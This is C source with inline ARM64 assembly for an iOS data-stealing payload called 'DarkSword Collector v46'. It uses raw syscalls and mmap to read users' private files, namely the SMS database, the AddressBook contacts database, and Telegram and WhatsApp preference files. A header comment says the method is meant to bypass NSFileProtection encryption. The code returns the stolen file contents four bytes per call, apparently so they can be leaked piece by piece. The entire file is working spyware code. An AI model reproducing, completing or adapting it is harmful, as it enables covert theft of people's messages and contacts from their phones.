/**
 * DarkSword Collector v46 - Try mmap instead of read to bypass NSFileProtection
 * mmap maps kernel page cache directly, might bypass file-level encryption checks
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc6(long n, long a, long b, long c, long d, long e, long f) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e; register long x5 __asm__("x5") = f;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_close 6
#define SYS_mmap  197
#define SYS_munmap 73
#define O_RDONLY  0
#define PROT_READ 1
#define MAP_PRIVATE 0x0002
#define MAP_FAILED ((void*)-1)

static volatile int g_ctx = 0;

static const char *get_path(int id) {
    switch (id) {
        case 0: return "/etc/hosts";                                          /* known readable */
        case 1: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist"; /* known readable */
        case 2: return "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist";
        case 3: return "/var/mobile/Library/Preferences/net.whatsapp.WhatsApp.plist";
        case 4: return "/var/mobile/Library/SMS/sms.db";
        case 5: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
        default: return (void*)0;
    }
}

int ds_start(void) {
    int ctx = g_ctx;
    int fid = (ctx >> 16) & 0xFF;
    int chk = ctx & 0xFF;
    int num_files = 6;

    if (fid >= num_files) { g_ctx = 0; return 0xFFFFFFFF; }
    if (chk >= 5) { g_ctx = ((fid + 1) << 16); return 0xFF000000 | fid; }

    const char *path = get_path(fid);
    if (!path) { g_ctx = ((fid + 1) << 16); return 0xFD000000 | fid; }

    int fd = (int)_svc2(SYS_open, (long)path, O_RDONLY);
    if (fd < 0) { g_ctx = ((fid + 1) << 16); return 0xFE000000 | fid; }

    /* Try mmap instead of read */
    int page_off = chk * 4;
    void *mapped = (void*)_svc6(SYS_mmap, 0, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
    _svc1(SYS_close, fd);

    if (mapped == MAP_FAILED || mapped == (void*)0) {
        g_ctx = ((fid + 1) << 16);
        return 0xED000000 | fid;
    }

    /* Read 4 bytes from mapped memory at page_off */
    unsigned char *p = (unsigned char *)mapped + page_off;
    int result = (int)p[0] | ((int)p[1] << 8) | ((int)p[2] << 16) | ((int)p[3] << 24);

    _svc2(SYS_munmap, (long)mapped, 4096);

    g_ctx = (fid << 16) | (chk + 1);
    return result;
}
